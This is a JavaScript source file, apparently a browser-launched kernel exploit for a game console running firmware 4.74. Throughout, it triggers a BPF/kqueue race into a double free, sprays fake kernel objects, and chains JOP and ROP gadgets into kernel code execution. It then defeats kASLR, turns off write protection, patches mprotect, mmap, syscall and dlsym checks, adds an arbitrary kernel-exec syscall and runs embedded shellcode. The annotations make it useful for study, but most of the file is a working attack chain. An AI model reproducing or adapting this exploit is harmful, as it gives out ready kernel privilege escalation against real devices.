function kernExploit() {
  try {
    var offsetToWebKit = function (o) {
      return window.webKitBase.add32(o);
    }

    var fd = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
    var fd1 = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low; 

    if (fd == (-1 >>> 0)) {
      throw "Failed to open first bpf device!"
    }

    // Write BPF programs
    var bpf_valid = p.malloc32(0x4000);
    var bpf_spray = p.malloc32(0x4000);
    var bpf_valid_u32  = bpf_valid.backing;

    var bpf_valid_prog = p.malloc(0x40);
    p.write8(bpf_valid_prog, 0x800 / 8)
    p.write8(bpf_valid_prog.add32(8), bpf_valid)

    var bpf_spray_prog = p.malloc(0x40);
    p.write8(bpf_spray_prog, 0x800 / 8)
    p.write8(bpf_spray_prog.add32(8), bpf_spray)

    for (var i = 0; i < 0x400;) {
      bpf_valid_u32[i++] = 6;
      bpf_valid_u32[i++] = 0;
    }

    var rtv = p.syscall("sys_ioctl", fd, 0x8010427B, bpf_valid_prog);

    if(rtv.low != 0) {
      throw "Failed to open first bpf device!";
    }

    // Spawn thread
    var spawnthread = function (name, chain) {
      var longjmp = window.webKitBase.add32(0x1458);
      var createThread = window.webKitBase.add32(0x116ED40);
      var contextp = p.malloc32(0x2000);
      var contextz = contextp.backing;
      contextz[0] = 1337;
      var thread2 = new rop();
      thread2.push(window.gadgets["ret"]);
      thread2.push(window.gadgets["ret"]);
      thread2.push(window.gadgets["ret"]);
      thread2.push(window.gadgets["ret"]);
      chain(thread2);
      p.write8(contextp, window.gadgets["ret"]);
      p.write8(contextp.add32(0x10), thread2.stackBase);
      p.syscall(324, 1);
      var retv = function () { p.fcall(createThread, longjmp, contextp, p.stringify(name)); }
      window.nogc.push(contextp);
      window.nogc.push(thread2);
      return retv;
    }

    var interrupt1, loop1;
    var interrupt2, loop2;
    var sock = p.syscall(97, 2, 2);

    // Racing thread
    var start1 = spawnthread("GottaGoFast", function (thread2) {
      interrupt1 = thread2.stackBase;
      thread2.push(window.gadgets["ret"]);
      thread2.push(window.gadgets["ret"]);
      thread2.push(window.gadgets["ret"]);

      thread2.push(window.gadgets["pop rdi"]);
      thread2.push(fd);
      thread2.push(window.gadgets["pop rsi"]);
      thread2.push(0x8010427B);
      thread2.push(window.gadgets["pop rdx"]);
      thread2.push(bpf_valid_prog);
      thread2.push(window.gadgets["pop rsp"]);
      thread2.push(thread2.stackBase.add32(0x800));
      thread2.count = 0x100;
      var cntr = thread2.count;
      thread2.push(window.syscalls[54]); // ioctl
      thread2.push_write8(thread2.stackBase.add32(cntr * 8), window.syscalls[54]); // restore ioctl

      thread2.push(window.gadgets["pop rdi"]);
      var wherep = thread2.pushSymbolic();
      thread2.push(window.gadgets["pop rsi"]);
      var whatp = thread2.pushSymbolic();
      thread2.push(window.gadgets["mov [rdi], rsi"]);

      thread2.push(window.gadgets["pop rsp"]);

      loop1 = thread2.stackBase.add32(thread2.count * 8);
      thread2.push(0x41414141);

      thread2.finalizeSymbolic(wherep, loop1);
      thread2.finalizeSymbolic(whatp, loop1.sub32(8));
    });

    /**********************************************************************************************
     *
     * Kexploit + Annotation by Specter begins here
     *
     *********************************************************************************************/

    /*
     * We'll need to be able to memcpy bytes from kernel to userland in order to dump it.
     * We don't have the location of copyout() since it's a kernel function, but we don't need it.
     * Userland's memcpy() called from kernel context can be used. WebKit imports memcpy from libc
     * at offset 0xF8, therefore we can dereference it to get a perfectly working memcpy rather than
     * implement one ourselves.
     */
    var memcpy = get_jmptgt(webKitBase.add32(0xF8));
    memcpy = p.read8(memcpy);

    /*
     * Because 4.74 also has the RSP check against userland, we'll need to get the chain in kernel.
     * We'll use JOP to do this, so we'll need to take note of how far we've shifted.
     */
    var stackshift = 0;
    
    /*
     * Here we'll setup the ROP chains for the exploit thread that abuses the race condition
     * (known as 'race') and the chain to run in kernel context (known as 'krop').
     */
    var krop = new rop();
    var race = new rop();

    /*
     * A few buffers are needed to store information. 'savectx' will be used to save register context
     * at the beginning of the kernel ROP chain. We can use some of these register values to defeat kASLR,
     * as well as return to userland cleanly via the saved RBP value.
     */
    var kscratch      = p.malloc32(0x1000);
    var kernelBuf     = p.malloc(0x250000);

    /*
     * Here is where we'll allocate buffers to hold information which we will use to fake kernel objects,
     * notably we'll create a fake knote as well as a fake knote file operations function table.
     */
    var fakeKnote     = p.malloc32(0x1000);
    var fakeKnoteFops = p.malloc32(0x1000);
    var scratchBuf    = p.malloc32(0x1000);

    /*
     * Using the BPF filter program, we can spray the heap with our fake knote pointers.
     *
     * Additionally, we need to set knote->kn_status (offset: 0x50) to 0 for the corrupted
     * function pointer (f_detach()) to be called.
     *
     * Finally, our ultimate target is the function table at offset 0x68, knote->kn_fops,
     * the file operations table, which will again be an object faked in userland.
     * By writing the address of our stack pivot gadget to fakeKnoteFops+0x10, we achieve
     * code execution!
     */
    p.write8(bpf_spray.add32(0x10), fakeKnote);     // Spray heap with the fake knote object
    p.write8(fakeKnote.add32(0x50), 0);             // Set knote->kn_status to 0 to detach
    p.write8(fakeKnote.add32(0x68), fakeKnoteFops); // Set knote->kn_fops to fake function table
    p.write8(fakeKnoteFops.add32(0x10), window.gadgets["jop1"]);  // Set kn_fops->f_detach to first JOP gadget

    /*
     * JOP gadget one
     * -
     * This gadget creates stack space for us to put the kROP chain.
     * -
     * sub     rsp, 48h
     * mov     [rbp+var_30], edx
     * mov     [rbp+var_38], rsi
     * mov     r13, rdi
     * mov     r15, rsi
     * mov     rax, [r13+0]
     * call    qword ptr [rax+7D0h] ; rsp -= 8 on call instructions
     */

    /*
     * With 0x48 being explicitly subbed from RSP, and "call" implicitly subbing
     * 0x08, the shift total is 0x50.
     */
    stackshift = 0x50;

    /*
     * We can control rdi's value via knote+0. Since our first JOP gadget will use
     * rdi for it's next jump, we'll setup our next gadget by using a scratch buffer.
     *
     * Notice from JOP gadget one that we control the next jump via [rdi + 0x7D0].
     */
    p.write8(fakeKnote.add32(0x00), scratchBuf);  // Set rdi
    p.write8(fakeKnote.add32(0x10), scratchBuf.add32(0x08));
    p.write8(scratchBuf.add32(0x7D0), window.gadgets["jop2"]); // Chain to next gadget

    /*
     * JOP gadget two
     * -
     * This gadget allows us to iterate / loop. By combining gadget one and two,
     * we can continously chain calls to create stack space.
     * -
     * mov     rdi, [rdi+10h]
     * jmp     qword ptr [rax]
     */

    var iterbase = scratchBuf;

    for(var i = 0; i < 0xF; i++)
    {
      /* Gadget One repeated - see line 161. */
      p.write8(iterbase, window.gadgets["jop1"]); // Chain to next gadget
      stackshift += 0x50;

      /* Gadget Two repeated - see line 190. */
      p.write8(iterbase.add32(0x7D0 + 0x20), window.gadgets["jop2"]); // Chain to next gadget

      p.write8(iterbase.add32(0x08), iterbase.add32(0x20));
      p.write8(iterbase.add32(0x18), iterbase.add32(0x28));
      iterbase = iterbase.add32(0x20);
    }

    /*
     * After loop exit, we're back to gadget one, meaning our next jump will be at
     * iterbase + 0 (since the loop moves iterbase up for us). Next, we want to prepare
     * the memcpy call to copy the chain into kernel memory. We need to setup the following regs:
     *
     * rdi (memory destination pointer)
     * rsi (memory source pointer)
     * rdx (size in bytes)
     */

    var raxbase = iterbase;
    var rdibase = iterbase.add32(0x08);

    /*
     * First we'll setup RDX (size). Enter gadget 3, which will load rdx with [rdi + 0xB0],
     * and jump to the next gadget at [rdi + 0x70]. We won't actually write the size to 0xB0
     * in rdibase until we have the final stack shift.
     */

    p.write8(raxbase, window.gadgets["jop3"]); // Chain to next gadget
    stackshift += 0x08;

    /*
     * JOP gadget three
     * -
     * Load RDX.
     * -
     * mov     rdx, [rdi+0B0h]
     * call    qword ptr [rdi+70h] ; Note: "call" shifts rsp by 8.
     */

    p.write8(rdibase.add32(0x70), window.gadgets["jop4"]); // Chain to next gadget
    stackshift += 0x08;

    /*
     * Next we'll set RSI (source). Enter gadget 4, which will load rsi with [rdi + 0x08],
     * and jump to the next gadget at [rdi + 0x48] (or [rax + 0x30]).
     */

    /*
     * JOP gadget four
     * -
     * Loads RSI.
     * -
     * mov     rsi, [rdi+8]
     * mov     rdi, [rdi+18h]
     * mov     rax, [rdi]
     * call    qword ptr [rax+30h] ; Note: "call" shifts rsp by 8.
     */

    p.write8(rdibase.add32(0x18), rdibase);
    p.write8(rdibase.add32(0x08), krop.stackBase); // Sets RSI to krop stack's location
    p.write8(raxbase.add32(0x30), window.gadgets["jop5"]); // Save RSP

    /*
     * Finally we'll set RDI (destination). Using the RBP value we just saved, we
     * effectively can set RDI relative to RBP and get a valid kernel stack location.
     */

    /*
     * JOP gadget five
     * -
     * This gadget effectively saves RSP into RBP and calls [rdi + 0x420].
     * -
     * mov     rbp, rsp
     * mov     rax, [rdi]
     * call    qword ptr [rax+420h]
     */

    p.write8(rdibase.add32(0x00), raxbase); // [rdi] = rax
    p.write8(raxbase.add32(0x420), window.gadgets["jop6"]); // Chain to next gadget

    /*
     * JOP gadget six
     * -
     * Sets RDI to [rbp - 0x28] and calls [rax + 0x40].
     * -
     * lea     rdi, [rbp-28h]
     * call    qword ptr [rax+40h] ; Note: "call" shifts rsp by 8.
     */

    /*
     * Finally, we'll invoke memcpy(), but first, we need to set the size as mentioned
     * on line 230. We'll also skip the function prologue by jumping 0x32 bytes into memcpy.
     */

    var topOfChain = stackshift + 0x28; // Add 0x28 to accomodate for 0x28 being subbed from gadget 6
    p.write8(raxbase.add32(0x40), memcpy.add32(0x32)); // Chain to memcpy
    p.write8(rdibase.add32(0xB0), topOfChain); // Write size for memcpy

    /*
     * Pad out the chain with NOP's (ret gadgets)
     */
    for (var i = 0; i < 0x1000 / 8; i++) {
      p.write8(krop.stackBase.add32(i * 8), window.gadgets["ret"]);
    }

    krop.count = 0x10;

    /*
     * As a test, we can set the first and only gadget of our chain to that of an infloop.
     * This is a hacky way of detecting if your kernel ROP chain is running without debugging
     * capabilities. If the page freezes, but the system doesn't panic - it works. Once confirmed
     * working, this can be commented out in favor of the real kROP chain.
     */
    //krop.push(window.gadgets["infloop"]);

    /*
     * kscratch will be used as a space to move things around for ROP chain operations, kind of like
     * a little container.
     * -
     * +0x18 = points back to kscratch. Used to setup JOP gadget for `mov rbp, rsp`.
     * +0x40 = points to pop rax gaget. Used since `lea rdi, [rbp - 0x28]` is a JOP gadget, not ROP. JOP Gadget 6.
     * +0x50 = used for saving rbp to mem.
     * +0x58 = used to point back to kscratch+0x50. 
     * +0x90 = points to dump location / kernel base depending on what's commented.
     * +0x420 = points to pop rdi gadget. Used since `mov rbp, rsp` is a JOP gadget, not ROP.
     */
    p.write8(kscratch.add32(0x420), window.gadgets["pop rdi"]);
    p.write8(kscratch.add32(0x40), window.gadgets["pop rax"]);
    p.write8(kscratch.add32(0x18), kscratch);

    krop.push(window.gadgets["pop rdi"]);
    krop.push(kscratch.add32(0x18));
    krop.push(window.gadgets["mov rbp, rsp"]);

    var rboff = topOfChain - krop.count * 8 + 0x28;

    krop.push(window.gadgets["jop6"]); // lea rdi, [rbp - 0x28]
    krop.push(window.gadgets["pop rax"]);
    krop.push(rboff);
    krop.push(window.gadgets["add rdi, rax"]);

    /*
     * Here we can defeat kASLR. Because we have the return pointer at the top of the stack (which points
     * to the next instruction after the call we hijacked), we can use this to calculate the kernel's memory
     * layout. After dumping the kernel, we can see the slide is 0x1E48A0, so we'll subtract this from that
     * pointer and store it at kscratch+0x90. This can be used for patching as well.
     */
    krop.push(window.gadgets["mov rax, [rdi]"]);
    krop.push(window.gadgets["pop rcx"]);
    krop.push(0x1E48A0); // Slide of the return ptr from kernel base
    krop.push(window.gadgets["sub rax, rcx"]);
    krop.push(window.gadgets["mov rdx, rax"]);
    krop.push(window.gadgets["pop rsi"]);
    krop.push(kscratch.add32(0x90));
    krop.push(window.gadgets["mov [rsi], rdx"]);

    /*
     * This essentially overwrites the return pointer on the stack to skip the rest of kqueue_close(). Why?
     * since we just free()'d and corrupted the knote, allowing the kernel to do operations on it could be
     * catastrophic and crash the kernel. By setting it to jump to a function epilogue, the function returns
     * and everything's OK again.
     */
    krop.push(window.gadgets["pop rax"]);
    krop.push(window.gadgets["test"]); // function epilogue: sub rsp; pop ...; retn
    krop.push(window.gadgets["mov [rdi], rax"]);

    /**********************************************************************************************
     *
     * Annotation ends here (except line 378).
     * I'm too lazy to port all the patches so from this point, feel free to add patches in the ROP
     * chain here. Consider this a "template" as you will. ~ Specter
     *
     *********************************************************************************************/
	
	/*
	4.74 kernel offsets from kbase:
	cpu_setregs: 0x283120 // 4.74 - used for enable kernel write protection at end of kROP
	disable_write_protection: 0x283129 // 4.74 must be called before applying kernel patches
	sys_mmap_patch_offset: 0x1413A4 // 4.74
	amd64_syscall: 0x3DD3B0 // 4.74
	kernel_syscall_patch1_offset: 0x3DD4B3 // 4.74
	kernel_syscall_patch2_offset: 0x3DD4D1  // 4.74
	sys_dynlib_dlsym: 0x3D0470 // 4.74
	sys_dynlib_dlsym_patch1_offset: 0x3D05AE // 4.74
	sys_dynlib_dlsym_patch2_offset: 0x686A0 // 4.74
	crcopysafe: 0x113D50 // 4.74
	sys_setuid: 0x1144A0 // 4.74
	priv_check_cred_offset: 0x1145B1 // 4.74
	syscall table start offset : 0x1034790 // 4.74
	syscall 11 entry:
	0x1034790 + 11* 0x30 = 0x10349A0 // 4.74
	jmp_qword_ptr_rsi: 0x139A2F // 4.74
	*/
	 
	 
	// Disable kernel write protection
	krop.push(window.gadgets["pop rax"])//pop rax present
	krop.push(kscratch.add32(0x90));
	krop.push(window.gadgets["mov rax, [rax]"]);//present
	krop.push(window.gadgets["pop rcx"]);//present
	krop.push(0x283129);//done
	krop.push(window.gadgets["add rax, rcx"]);//present
	krop.push(offsetToWebKit(0x12a16)); // mov rdx, rax, already done
	krop.push(window.gadgets["pop rax"]);
	krop.push(0x80040033);
	krop.push(offsetToWebKit(0x1517c7)); // jmp rdx, done

	// Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
	// E8 C8 37 13 00 41 89 C6 -> B8 00 00 00 00 41 89 C6
	var kexploit_check_patch = new int64(0x000000B8, 0xC6894100);
	krop.push(window.gadgets["pop rax"])
	krop.push(kscratch.add32(0x90));
	krop.push(window.gadgets["mov rax, [rax]"]);
	krop.push(window.gadgets["pop rcx"]);
	krop.push(0x113B73);//done
	krop.push(window.gadgets["add rax, rcx"]);
	krop.push(window.gadgets["pop rsi"]);//present
	krop.push(kexploit_check_patch);
	krop.push(window.gadgets["mov [rax], rsi"]);//present

	// Patch mprotect: Allow RWX (read-write-execute) mapping
	var mprotect_patch = new int64(0x9090FA38, 0x90909090);
	krop.push(window.gadgets["pop rax"])
	krop.push(kscratch.add32(0x90));
	krop.push(window.gadgets["mov rax, [rax]"]);
	krop.push(window.gadgets["pop rcx"]);
	krop.push(0x397876);//done
	krop.push(window.gadgets["add rax, rcx"]);
	krop.push(window.gadgets["pop rsi"]);
	krop.push(mprotect_patch);
	krop.push(window.gadgets["mov [rax], rsi"]);
	
	// Patch sys_mmap: Allow RWX (read-write-execute) mapping
	var kernel_mmap_patch = new int64(0x37b64137, 0x3145c031);
	krop.push(window.gadgets["pop rax"])
	krop.push(kscratch.add32(0x90));
	krop.push(window.gadgets["mov rax, [rax]"]);
	krop.push(window.gadgets["pop rcx"]);
	krop.push(0x1413A4);//done
	krop.push(window.gadgets["add rax, rcx"]);
	krop.push(window.gadgets["pop rsi"]);
	krop.push(kernel_mmap_patch);
	krop.push(window.gadgets["mov [rax], rsi"]);

	// Patch syscall: syscall instruction allowed anywhere
	var kernel_syscall_patch1 = new int64(0x00000000, 0x40878b49);
	var kernel_syscall_patch2 = new int64(0x909079eb, 0x72909090);
	krop.push(window.gadgets["pop rax"])
	krop.push(kscratch.add32(0x90));
	krop.push(window.gadgets["mov rax, [rax]"]);
	krop.push(window.gadgets["pop rcx"]);
	krop.push(0x3DD4B3);//done
	krop.push(window.gadgets["add rax, rcx"]);
	krop.push(window.gadgets["pop rsi"]);
	krop.push(kernel_syscall_patch1);
	krop.push(window.gadgets["mov [rax], rsi"]);
	krop.push(window.gadgets["pop rax"])
	krop.push(kscratch.add32(0x90));
	krop.push(window.gadgets["mov rax, [rax]"]);
	krop.push(window.gadgets["pop rcx"]);
	krop.push(0x3DD4D1);//done
	krop.push(window.gadgets["add rax, rcx"]);
	krop.push(window.gadgets["pop rsi"]);
	krop.push(kernel_syscall_patch2);
	krop.push(window.gadgets["mov [rax], rsi"]);

	// Patch sys_dynlib_dlsym: Allow from anywhere
	var kernel_dlsym_patch1 = new int64(0x000352E9, 0x8B489000);
	var kernel_dlsym_patch2 = new int64(0x90C3C031, 0x90909090);
	krop.push(window.gadgets["pop rax"])
	krop.push(kscratch.add32(0x90));
	krop.push(window.gadgets["mov rax, [rax]"]);
	krop.push(window.gadgets["pop rcx"]);
	krop.push(0x3D05AE);//done
	krop.push(window.gadgets["add rax, rcx"]);
	krop.push(window.gadgets["pop rsi"]);
	krop.push(kernel_dlsym_patch1);
	krop.push(window.gadgets["mov [rax], rsi"]);
	krop.push(window.gadgets["pop rax"])
	krop.push(kscratch.add32(0x90));
	krop.push(window.gadgets["mov rax, [rax]"]);
	krop.push(window.gadgets["pop rcx"]);
	krop.push(0x686A0);//done
	krop.push(window.gadgets["add rax, rcx"]);
	krop.push(window.gadgets["pop rsi"]);
	krop.push(kernel_dlsym_patch2);
	krop.push(window.gadgets["mov [rax], rsi"]);

	// Add custom sys_exec() call to execute arbitrary code as kernel
	var kernel_exec_param = new int64(0, 1);
	krop.push(window.gadgets["pop rax"])
	krop.push(kscratch.add32(0x90));
	krop.push(window.gadgets["mov rax, [rax]"]);
	krop.push(window.gadgets["pop rcx"]);
	krop.push(0x10349A0);//done
	krop.push(window.gadgets["add rax, rcx"]);
	krop.push(window.gadgets["pop rsi"]);
	krop.push(0x02);
	krop.push(window.gadgets["mov [rax], rsi"]);
	krop.push(window.gadgets["pop rsi"])
	krop.push(0x139A2F); // jmp qword ptr [rsi],done
	krop.push(window.gadgets["pop rdi"])
	krop.push(kscratch.add32(0x90));
	krop.push(offsetToWebKit(0x119d1f0)); //add rsi, [rdi]; mov rax, rsi, done
	krop.push(window.gadgets["pop rax"])
	krop.push(kscratch.add32(0x90));
	krop.push(window.gadgets["mov rax, [rax]"]);
	krop.push(window.gadgets["pop rcx"]);
	krop.push(0x10349A8);//done
	krop.push(window.gadgets["add rax, rcx"]);
	krop.push(window.gadgets["mov [rax], rsi"]);
	krop.push(window.gadgets["pop rax"])
	krop.push(kscratch.add32(0x90));
	krop.push(window.gadgets["mov rax, [rax]"]);
	krop.push(window.gadgets["pop rcx"]);
	krop.push(0x10349C8);//done
	krop.push(window.gadgets["add rax, rcx"]);
	krop.push(window.gadgets["pop rsi"]);
	krop.push(kernel_exec_param);
	krop.push(window.gadgets["mov [rax], rsi"]);
	
	// Enable kernel write protection
	krop.push(window.gadgets["pop rax"])
	krop.push(kscratch.add32(0x90));
	krop.push(window.gadgets["mov rax, [rax]"]);
	krop.push(window.gadgets["pop rcx"]);
	krop.push(0x283120);//done
	krop.push(window.gadgets["add rax, rcx"]);
	krop.push(window.gadgets["jmp rax"]);//jmp rax present	

    /*
     * End Patches
     */

    var shellbuf = p.malloc32(0x1000);

    /*
     * Clean up the stack and return to normal execution.
     */
    krop.push(window.gadgets["pop rdi"]); // save address in usermode
    krop.push(kscratch);
    krop.push(window.gadgets["mov [rdi], rax"]);

    krop.push(window.gadgets["ret2userland"]);
    krop.push(kscratch.add32(0x1000));

    // Run exploit
    var kq  = p.malloc32(0x10);
    var kev = p.malloc32(0x100);
    kev.backing[0] = sock;
    kev.backing[2] = 0x1ffff;
    kev.backing[3] = 1;
    kev.backing[4] = 5;

    // Shellcode to clean up memory
	var shcode = [0x00008be9, 0x90909000, 0x90909090, 0x90909090, 0x0082b955, 0x8948c000, 0x415641e5, 0x53544155, 0x8949320f, 0xbbc089d4, 0x00000100, 0x20e4c149, 0x48c40949, 0x0096058d, 0x8d490000, 0x48302494, 0x8d4dffcf, 0xcdf024b4, 0x8d4d000e, 0xc76024ac, 0x8149ffd0, 0x660570c4, 0x10894801, 0x00401f0f, 0x000002ba, 0xe6894c00, 0x000800bf, 0xd6ff4100, 0x393d8d48, 0x48000000, 0xc031c689, 0x83d5ff41, 0xdc7501eb, 0x41c0315b, 0x415d415c, 0x90c35d5e, 0x3d8d4855, 0xffffff78, 0x8948f631, 0x00e95de5, 0x48000000, 0x000bc0c7, 0x89490000, 0xc3050fca, 0x6c616d6b, 0x3a636f6c, 0x25783020, 0x6c363130, 0x00000a58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
    for (var i = 0; i < shcode.length; i++) {
      shellbuf.backing[i] = shcode[i];
    }

    var iters = 0;
    start1();

    while(1) {
      race.count = 0;

      // Create a kqueue
      race.push(window.syscalls[362]);
      race.push(window.gadgets["pop rdi"]);
      race.push(kq);
      race.push(window.gadgets["mov [rdi], rax"]);

      // Race against the other thread
      race.push(window.gadgets["ret"]);
      race.push(window.gadgets["ret"]);
      race.push(window.gadgets["ret"]);
      race.push(window.gadgets["ret"]);
      race.push_write8(loop1, interrupt1);
      race.push(window.gadgets["pop rdi"]);
      race.push(fd);
      race.push(window.gadgets["pop rsi"]);
      race.push(0x8010427B);
      race.push(window.gadgets["pop rdx"]);
      race.push(bpf_valid_prog);
      race.push(window.syscalls[54]);

      // Attempt to trigger double free()
      race.push(window.gadgets["pop rax"]);
      race.push(kq);
      race.push(window.gadgets["mov rax, [rax]"]);
      race.push(window.gadgets["pop rdi"]);
      race.push(0);
      race.push(window.gadgets["add rdi, rax"]);
      race.push(window.gadgets["pop rsi"]);
      race.push(kev);
      race.push(window.gadgets["pop rdx"]);
      race.push(1);
      race.push(window.gadgets["pop rcx"]);
      race.push(0);
      race.push(window.gadgets["pop r8"]);
      race.push(0);
      race.push(window.syscalls[363]);

      // Spray via ioctl
      race.push(window.gadgets["pop rdi"]);
      race.push(fd1);
      race.push(window.gadgets["pop rsi"]);
      race.push(0x8010427B);
      race.push(window.gadgets["pop rdx"]);
      race.push(bpf_spray_prog);
      race.push(window.syscalls[54]);

      // Close the poisoned kqueue and run the kROP chain!
      race.push(window.gadgets["pop rax"]);
      race.push(kq);
      race.push(window.gadgets["mov rax, [rax]"]);
      race.push(window.gadgets["pop rdi"]);
      race.push(0);
      race.push(window.gadgets["add rdi, rax"]);
      race.push(window.syscalls[6]);
      iters++;

      // Gotta go fast!
      race.run();

      if (kscratch.backing[0] != 0) {
        // Hey, we won!
		//alert("Hey, we won!");
				
        // Clean up memory
        p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
        p.fcall(shellbuf);

        // Refresh to a clean page
        location.reload();

		return true;
      }
    }
  } catch(ex) {
    fail(ex)
  }

  // failed
  return false;
}

kernExploit();